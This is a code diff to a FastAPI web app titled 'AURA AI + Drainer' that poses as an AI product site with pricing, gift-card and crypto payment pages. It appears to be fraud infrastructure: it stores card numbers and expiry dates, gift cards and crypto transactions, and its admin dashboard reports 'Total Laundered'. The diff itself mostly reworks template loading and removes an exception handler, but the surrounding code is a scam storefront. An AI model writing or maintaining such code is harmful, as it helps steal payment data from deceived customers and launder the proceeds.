@@ -73,7 +73,7 @@ gift_cards = storage.get("gift_cards", [])
 crypto_txs = storage.get("crypto_txs", [])
 withdrawals = storage.get("withdrawals", [])
 
-# ---------- Pydantic Models (V2) ----------
+# ---------- Pydantic Models (V2 style) ----------
 class CardPayload(BaseModel):
     cardNumber: str
     exp: str
@@ -104,9 +104,10 @@ class CardPayload(BaseModel):
 # ---------- FastAPI App ----------
 app = FastAPI(title="AURA AI + Drainer")
 
-# ---------- Jinja2 Templates (FunctionLoader - no caching issues) ----------
-TEMPLATES = {
-    "base.html": """<!DOCTYPE html>
+# ---------- Jinja2 Templates (all HTML) ----------
+templates_env = jinja2.Environment(
+    loader=jinja2.DictLoader({
+        "base.html": '''<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -157,8 +158,9 @@ TEMPLATES = {
     <main>{% block content %}{% endblock %}</main>
     <footer><p>&copy; 2026 AURA AI – Intelligent Automation</p></footer>
 </body>
-</html>""",
-    "index.html": """{% extends "base.html" %}
+</html>
+''',
+        "index.html": '''{% extends "base.html" %}
 {% block title %}AURA AI – Next‑Gen Intelligence{% endblock %}
 {% block content %}
 <section class="hero">
@@ -178,8 +180,9 @@ TEMPLATES = {
         </div>
     </div>
 </section>
-{% endblock %}""",
-    "pricing.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "pricing.html": '''{% extends "base.html" %}
 {% block title %}Pricing – AURA AI{% endblock %}
 {% block content %}
 <div class="container">
@@ -201,8 +204,9 @@ TEMPLATES = {
         </div>
     </div>
 </div>
-{% endblock %}""",
-    "gift.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "gift.html": '''{% extends "base.html" %}
 {% block title %}Pay with Gift Card{% endblock %}
 {% block content %}
 <div class="container">
@@ -232,8 +236,9 @@ document.getElementById('gift-form').addEventListener('submit', async (e) => {
     document.getElementById('gift-result').innerText = data.message || data.error;
 });
 </script>
-{% endblock %}""",
-    "crypto.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "crypto.html": '''{% extends "base.html" %}
 {% block title %}Pay with Crypto{% endblock %}
 {% block content %}
 <div class="container">
@@ -266,8 +271,9 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     document.getElementById('crypto-result').innerText = data.message || data.error;
 });
 </script>
-{% endblock %}""",
-    "admin.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "admin.html": '''{% extends "base.html" %}
 {% block title %}Admin Dashboard{% endblock %}
 {% block content %}
 <div class="container">
@@ -298,16 +304,18 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     <p><strong>Total Laundered:</strong> ${{ total_laundered|round(2) }}</p>
     <p><strong>Processed Orders:</strong> {{ processed_count }}</p>
 </div>
-{% endblock %}""",
-    "about.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "about.html": '''{% extends "base.html" %}
 {% block title %}About Us{% endblock %}
 {% block content %}
 <div class="container">
     <h1>About AURA AI</h1>
     <p>We're a cutting‑edge AI research lab.</p>
 </div>
-{% endblock %}""",
-    "admin_login.html": """{% extends "base.html" %}
+{% endblock %}
+''',
+        "admin_login.html": '''{% extends "base.html" %}
 {% block title %}Admin Login{% endblock %}
 {% block content %}
 <div class="container">
@@ -321,28 +329,12 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     </form>
     {% if error %}<p class="error">{{ error }}</p>{% endif %}
 </div>
-{% endblock %}"""
-}
-
-def load_template(template_name):
-    return TEMPLATES.get(template_name)
-
-templates_env = jinja2.Environment(
-    loader=jinja2.FunctionLoader(load_template),
-    auto_reload=True,
-    cache_size=0
+{% endblock %}
+'''
+    })
 )
 
 templates = Jinja2Templates(env=templates_env)
-
-# ---------- Global Exception Handler ----------
-@app.exception_handler(Exception)
-async def global_exception_handler(request: Request, exc: Exception):
-    logger.error(f"Unhandled exception: {exc}", exc_info=True)
-    return JSONResponse(
-        status_code=500,
-        content={"detail": str(exc), "path": request.url.path}
-    )
 
 # ---------- Frontend Routes ----------
 @app.get("/", response_class=HTMLResponse)
@@ -397,7 +389,6 @@ async def pay_crypto(request: Request):
     source = form.get("source_address", "")
     if amount <= 0:
         return JSONResponse({"error": "Amount must be > 0"}, status_code=400)
-    # Simulate price
     price = 60000 if currency == "BTC" else 3000 if currency == "ETH" else 1
     usd_value = amount * price
     usd_received = usd_value * 0.99
